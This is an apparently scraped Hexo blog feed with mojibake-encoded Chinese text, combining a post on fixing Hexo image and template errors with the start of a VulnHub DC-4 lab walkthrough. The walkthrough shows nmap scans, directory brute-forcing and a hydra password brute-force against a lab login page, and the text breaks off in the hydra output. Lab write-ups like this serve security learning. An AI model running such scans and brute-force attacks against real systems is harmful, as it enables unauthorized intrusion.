href="https://www.jianshu.com/p/3db6a61d3782">hexoä½¿ç”¨markdownå›¾ç‰‡æ— æ³•æ˜¾ç¤ºé—®é¢˜ - ç®€ä¹¦ (jianshu.com)</a></p></blockquote><p>Hexo è€ç‰ˆæœ¬é»˜è®¤æ— æ³•è‡ªåŠ¨å¤„ç†æ–‡ç« æ’å…¥çš„æœ¬åœ°å›¾ç‰‡ï¼Œéœ€è¦é€šè¿‡æ‰©å±•æ’ä»¶æ”¯æŒï¼Œè™½ç„¶æ–°ç‰ˆæœ¬å¯ä»¥å¤„ç†äº†ä½†è¿˜æ˜¯å­˜åœ¨æ— æ³•æ˜¾ç¤ºçš„é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸º Hexo å¤„ç†åçš„æ–‡ä»¶è·¯å¾„å¤šäº†ä¸€å±‚æ–‡ä»¶å¤¹ï¼ŒåŒæ—¶åœ¨æ–°ç‰ˆæœ¬ä¸­è€æ’ä»¶ä¹Ÿå‡ºç°é—®é¢˜ã€‚</p><p><strong>é—®é¢˜ï¼š</strong></p><p>ç”±äº Hexo 3ç‰ˆæœ¬åå¯¹å¾ˆå¤šæ’ä»¶æ”¯æŒæœ‰é—®é¢˜ï¼Œ<a href="https://github.com/CodeFalling/hexo-asset-image.git">hexo-asset-image</a> æ’ä»¶åœ¨å¤„ç† <code>data.permalink</code> é“¾æ¥æ—¶å‡ºç°è·¯å¾„é”™è¯¯ï¼ŒæŠŠå¹´æœˆå»æ‰äº†ï¼Œå¯¼è‡´æœ€åç”Ÿæˆçš„è·¯å¾„ä¸º <code>%d/xxx/xxx</code> éœ€è¦å¯¹å…¶åšå…¼å®¹å¤„ç†ã€‚é€šè¿‡åˆ¤æ–­å½“å‰ç‰ˆæœ¬æ˜¯å¦ç­‰äº<code>3</code>çš„ç‰ˆæœ¬åšä¸åŒçš„è·¯å¾„åˆ†å‰²ã€‚</p><p>åœ¨ä»£ç ä¸­åŠ å…¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> version = <span class="hljs-built_in">String</span>(hexo.version).split(<span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>date.permalink</code> å¤„ç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> link = data.permalink;  <br><span class="hljs-keyword">if</span>(version.length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">Number</span>(version[<span class="hljs-number">0</span>]) == <span class="hljs-number">3</span>) <br>    <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>; <br><span class="hljs-keyword">else</span> <br>    <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆé™æ€æ–‡ä»¶å³å¯æ­£ç¡®æ˜¾ç¤ºã€‚</p><p>å¯ç›´æ¥å®‰è£…å·²ç»ä¿®æ”¹è¿‡å¾—æ’ä»¶ <code>npm install https://github.com/7ym0n/hexo-asset-image --save</code>ã€‚</p><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><p>1ï¼‰é…ç½® <code>_config.yml</code> é‡Œé¢çš„ <code>post_asset_folder:false</code> è¿™ä¸ªé€‰é¡¹è®¾ç½®ä¸º <code>true</code>ã€‚</p><p>2ï¼‰å®‰è£… <a href="https://github.com/7ym0n/hexo-asset-image.git">hexo-asset-image</a>ï¼ˆå·²ä¿®æ”¹è¿‡çš„ï¼‰ï¼Œè¿è¡Œ <code>hexo n &quot;xxxx&quot;</code> æ¥ç”Ÿæˆmdåšæ–‡æ—¶ï¼Œ<code>/source/_posts</code> æ–‡ä»¶å¤¹å†…é™¤äº† <code>xxxx.md</code> æ–‡ä»¶è¿˜æœ‰ä¸€ä¸ªåŒåçš„æ–‡ä»¶å¤¹ï¼ŒæŠŠå›¾ç‰‡æ”¾å…¥è¯¥æ–‡ä»¶å¤¹å³å¯ã€‚</p><p>3ï¼‰ä½¿ç”¨ <code>![xxx](xxx/xxx.png)</code> ç›´æ¥æ’å…¥å›¾ç‰‡å³å¯ã€‚</p><h2 id="äºŒã€Error"><a href="#äºŒã€Error" class="headerlink" title="äºŒã€Error"></a>äºŒã€Error</h2><h3 id="1ã€title-ä¸­å«æœ‰-â€œ-â€œ-å¯¼è‡´é”™è¯¯"><a href="#1ã€title-ä¸­å«æœ‰-â€œ-â€œ-å¯¼è‡´é”™è¯¯" class="headerlink" title="1ã€title ä¸­å«æœ‰ â€œ: â€œ å¯¼è‡´é”™è¯¯"></a>1ã€title ä¸­å«æœ‰ â€œ: â€œ å¯¼è‡´é”™è¯¯</h3><p><strong>é”™è¯¯ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">13562@DESKTOP-8HHTU8A MINGW64 /d/Blog/blog<br>$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>ERROR &#123;<br>  err: YAMLException: incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line at line 1, column 13:<br>      title: W1R3S: 1.0.1<br>                  ^<br>      at generateError (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:167:10)<br>      at throwError (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:173:9)<br>      at readBlockMapping (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1027:9)<br>      at composeNode (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1359:12)<br>      at readDocument (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1525:3)<br>      at loadDocuments (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1588:5)<br>      at Object.load (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1614:19)<br>      at parseYAML (D:\Blog\blog\node_modules\hexo-front-matter\lib\front_matter.js:69:23)<br>      at parse (D:\Blog\blog\node_modules\hexo-front-matter\lib\front_matter.js:50:12)<br>      at D:\Blog\blog\node_modules\hexo\lib\plugins\processor\post.js:51:20<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:544:35)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at Promise._fulfill (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:673:18)<br>      at PromiseArray._resolve (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:127:19)<br>      at PromiseArray._promiseFulfilled (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:145:14)<br>      at PromiseArray._iterate (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:115:31)<br>      at PromiseArray.init [as _init] (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:79:10)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:601:21)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at Promise._fulfill (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:673:18)<br>      at PromiseArray._resolve (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:127:19)<br>      at PromiseArray._promiseFulfilled (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:145:14)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:609:26)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10) &#123;<br>    reason: <span class="hljs-string">&#x27;incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line&#x27;</span>,<br>    mark: Mark &#123;<br>      name: null,<br>      buffer: <span class="hljs-string">&#x27;title: W1R3S: 1.0.1\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;date: 2022-05-01\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;categories: Penetration\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;tags: [Penetration, vulnhub]\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;\x00&#x27;</span>,<br>      position: 12,<br>      line: 0,<br>      column: 12<br>    &#125;<br>  &#125;<br>&#125; Process failed: %s _posts/Penetration/Vulnhub/Part-1/0x02 W1R3S.md<br></code></pre></td></tr></table></figure><p><strong>åŸå› ï¼š</strong> <code>title</code> ä¸­æœ‰<strong>è‹±æ–‡å†’å·åŠ ç©ºæ ¼</strong>ã€‚ä¾‹å¦‚ï¼š<code>title: W1R3S: 1.0.1</code></p><p><strong>è§£å†³æ–¹æ³•ï¼š</strong>å¯ä»¥æŠŠè‹±æ–‡çš„ <code>:</code> æ”¹æˆä¸­æ–‡çš„ <code>ï¼š</code> ã€‚</p><h3 id="2ã€å†…å®¹å«æœ‰-å¯¼è‡´é”™è¯¯"><a href="#2ã€å†…å®¹å«æœ‰-å¯¼è‡´é”™è¯¯" class="headerlink" title="2ã€å†…å®¹å«æœ‰  å¯¼è‡´é”™è¯¯"></a>2ã€å†…å®¹å«æœ‰ {{  }} å¯¼è‡´é”™è¯¯</h3><p><strong>é”™è¯¯ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hexo s</span><br>INFO  Validating config<br>INFO  Start processing<br>INFO  [Fluid] è¯»å– _config.yml ä¸­ theme_config é…ç½®é¡¹è¦†ç›–é…ç½®<br>update link as:--&gt;/2023/03/23/Test/test-local-image/image-20230323112709634.png<br>update link as:--&gt;/2023/03/23/Test/test-local-image/image-20230323112709634.png<br>FATAL &#123;<br>  err: Error [Nunjucks Error]: _posts/MessUp/Hexo-Issue-Error.md [Line 30, Column 89] unexpected token: &#125;&#125;<br>      =====               Context Dump               =====<br>      === (line number probably different from source) ===<br>    25 | &lt;p&gt;3ï¼‰ä½¿ç”¨ &lt;code&gt;![xxx](xxx/xxx.png)&lt;/code&gt; ç›´æ¥æ’å…¥å›¾ç‰‡å³å¯ã€‚&lt;/p&gt;<br>    26 | &lt;h2 id=&quot;äºŒã€Error&quot;&gt;&lt;a href=&quot;#äºŒã€Error&quot; class=&quot;headerlink&quot; title=&quot;äºŒã€Error&quot;&gt;&lt;/a&gt;äºŒã€Error&lt;/h2&gt;&lt;h3 id=&quot;1ã€title-ä¸­å«æœ‰-â€œ-â€œ-å¯¼è‡´é”™è¯¯&quot;&gt;&lt;a href=&quot;#1ã€title-ä¸­å«æœ‰-â€œ-â€œ-å¯¼è‡´é”™è¯¯&quot; class=&quot;headerlink&quot; title=&quot;1ã€title ä¸­å«æœ‰ â€œ: â€œ å¯¼è‡´é”™è¯¯&quot;&gt;&lt;/a&gt;1ã€title ä¸­å«æœ‰ â€œ: â€œ å¯¼è‡´é”™è¯¯&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;hexo s&lt;/code&gt; åå‡ºç°é”™è¯¯ï¼š&lt;/strong&gt;&lt;/p&gt;<br>    27 | &lt;!--code 3--&gt;<br>    28 | &lt;p&gt;&lt;strong&gt;åŸå› ï¼š&lt;/strong&gt; &lt;code&gt;title&lt;/code&gt; ä¸­æœ‰&lt;strong&gt;è‹±æ–‡å†’å·åŠ ç©ºæ ¼&lt;/strong&gt;ã€‚ä¾‹å¦‚ï¼š&lt;code&gt;title: W1R3S: 1.0.1&lt;/code&gt;&lt;/p&gt;<br>    29 | &lt;p&gt;&lt;strong&gt;è§£å†³æ–¹æ³•ï¼š&lt;/strong&gt;å¯ä»¥æŠŠè‹±æ–‡çš„ &lt;code&gt;:&lt;/code&gt; æ”¹æˆä¸­æ–‡çš„ &lt;code&gt;ï¼š&lt;/code&gt; ã€‚&lt;/p&gt;<br>    30 | &lt;h3 id=&quot;2ã€å†…å®¹å«æœ‰-â€œ-â€-å¯¼è‡´é”™è¯¯&quot;&gt;&lt;a href=&quot;#2ã€å†…å®¹å«æœ‰-â€œ-â€-å¯¼è‡´é”™è¯¯&quot; class=&quot;headerlink&quot; title=&quot;2ã€å†…å®¹å«æœ‰ â€œ&#123;&#123;&#125;&#125;â€ å¯¼è‡´é”™è¯¯&quot;&gt;&lt;/a&gt;2ã€å†…å®¹å«æœ‰ â€œ&#123;&#123;&#125;&#125;â€ å¯¼è‡´é”™è¯¯&lt;/h3&gt;<br>      =====             Context Dump Ends            =====<br>      at formatNunjucksError (D:\Blog\blog\node_modules\hexo\lib\extend\tag.js:171:13)<br>      at D:\Blog\blog\node_modules\hexo\lib\extend\tag.js:246:36<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:547:31)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:725:18)<br>      at _drainQueueStep (D:\Blog\blog\node_modules\bluebird\js\release\async.js:93:12)<br>      at _drainQueue (D:\Blog\blog\node_modules\bluebird\js\release\async.js:86:9)<br>      at Async._drainQueues (D:\Blog\blog\node_modules\bluebird\js\release\async.js:102:5)<br>      at Immediate.Async.drainQueues [as _onImmediate] (D:\Blog\blog\node_modules\bluebird\js\release\async.js:15:14)<br>      at processImmediate (internal/timers.js:464:21) &#123;<br>    line: 30,<br>    location: &#x27;_posts/MessUp/Hexo-Issue-Error.md [Line 30, Column 89]&#x27;,<br>    type: &#x27;unexpected token: &#125;&#125;&#x27;<br>  &#125;<br>&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html<br><br></code></pre></td></tr></table></figure><p><strong>åŸå› ï¼š</strong></p><p>æ ¹æ®æç¤ºè®¿é—® <a href="https://hexo.io/docs/troubleshooting.html">https://hexo.io/docs/troubleshooting.html</a> ï¼Œæ‰¾åˆ°åŸå› ï¼š</p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323141735849.png" alt="image-20230323141735849" style="zoom:67%;"></p><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># æ–¹æ³•1</span><br>&#123;% raw %&#125;<br>Hello &#123;&#123; world &#125;&#125;<br>&#123;% endraw %&#125;<br><br><span class="hljs-section"># æ–¹æ³•2</span><br><span class="hljs-code">```</span><br><span class="hljs-code">Hello &#123;&#123; world &#125;&#125;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># æ–¹æ³•3</span><br><span class="hljs-code">`Hello &#123;&#123; world &#125;&#125;`</span><br></code></pre></td></tr></table></figure><h3 id="3ã€æ ‡é¢˜ä½¿ç”¨-å¯¼è‡´é”™è¯¯"><a href="#3ã€æ ‡é¢˜ä½¿ç”¨-å¯¼è‡´é”™è¯¯" class="headerlink" title="3ã€æ ‡é¢˜ä½¿ç”¨  å¯¼è‡´é”™è¯¯"></a>3ã€æ ‡é¢˜ä½¿ç”¨ `{{  }}` å¯¼è‡´é”™è¯¯</h3><p><strong>é”™è¯¯ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>INFO  [Fluid] è¯»å– _config.yml ä¸­ theme_config é…ç½®é¡¹è¦†ç›–é…ç½®<br>FATAL &#123;<br>  err: AssertionError [ERR_ASSERTION]: The expression evaluated to a falsy value:<br><br>    assert(cache[index])<br><br>      at D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:25:3<br>      at String.replace (&lt;anonymous&gt;)<br>      at PostRenderCache.restoreAllSwigTags (D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:37:26)<br>      at Object.onRenderEnd (D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:291:35)<br>      at D:\Blog\blog\node_modules\hexo\lib\hexo\render.js:79:21<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:547:31)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at _drainQueueStep (D:\Blog\blog\node_modules\bluebird\js\release\async.js:93:12)<br>      at _drainQueue (D:\Blog\blog\node_modules\bluebird\js\release\async.js:86:9)<br>      at Async._drainQueues (D:\Blog\blog\node_modules\bluebird\js\release\async.js:102:5)<br>      at Immediate.Async.drainQueues [as _onImmediate] (D:\Blog\blog\node_modules\bluebird\js\release\async.js:15:14)<br>      at processImmediate (internal/timers.js:464:21) &#123;<br>    generatedMessage: <span class="hljs-literal">true</span>,<br>    code: <span class="hljs-string">&#x27;ERR_ASSERTION&#x27;</span>,<br>    actual: null,<br>    expected: <span class="hljs-literal">true</span>,<br>    operator: <span class="hljs-string">&#x27;==&#x27;</span><br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><strong>åŸå› ï¼š</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ ‡é¢˜ä¸­ä½¿ç”¨ <span class="hljs-code">`&#123;&#123; &#125;&#125;`</span> å¯¼è‡´é”™è¯¯<br></code></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ”¹ä¸ºä½¿ç”¨ &#123;% raw %&#125;&#123;&#123;  &#125;&#125;&#123;% endraw %&#125; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š4</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x07%20DC-4/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x07%20DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="0x07-DC-4-vulnhub"><a href="#0x07-DC-4-vulnhub" class="headerlink" title="0x07 DC: 4~vulnhub"></a>0x07 DC: 4~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.159</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.159</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.159</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 20:03 EDT<br>Nmap scan report for 192.168.135.159<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)<br>|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)<br>|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)<br>80/tcp open  http    nginx 1.15.10<br>|_http-server-header: nginx/1.15.10<br>|_http-title: System Tools<br>MAC Address: 00:0C:29:A2:63:02 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>nginx 1.15.10</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.159  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.159</span>                                                              <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.159/_22-07-10_20-11-36.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_20-11-36.log<br>Target: http://192.168.135.159/<br><br>[20:11:36] Starting: <br>[20:12:49] 302 -  704B  - /command.php  -&gt;  index.php                       <br>[20:12:56] 301 -  170B  - /css  -&gt;  http://192.168.135.159/css/             <br>[20:13:20] 301 -  170B  - /images  -&gt;  http://192.168.135.159/images/       <br>[20:13:20] 403 -  556B  - /images/                                          <br>[20:13:21] 200 -  506B  - /index.php                                        <br>[20:13:22] 403 -   15B  - /index.pHp                                        <br>[20:13:32] 302 -  206B  - /login.php  -&gt;  index.php                         <br>[20:13:33] 302 -  163B  - /logout.php  -&gt;  index.php                        <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ä¸ªç™»å½•é¡µï¼Œå°è¯•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.135.159 http-form-post <span class="hljs-string">&#x27;/login.php:username=^USER^&amp;password=^PASS^:S=logout&#x27;</span></span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 20:37:28<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip 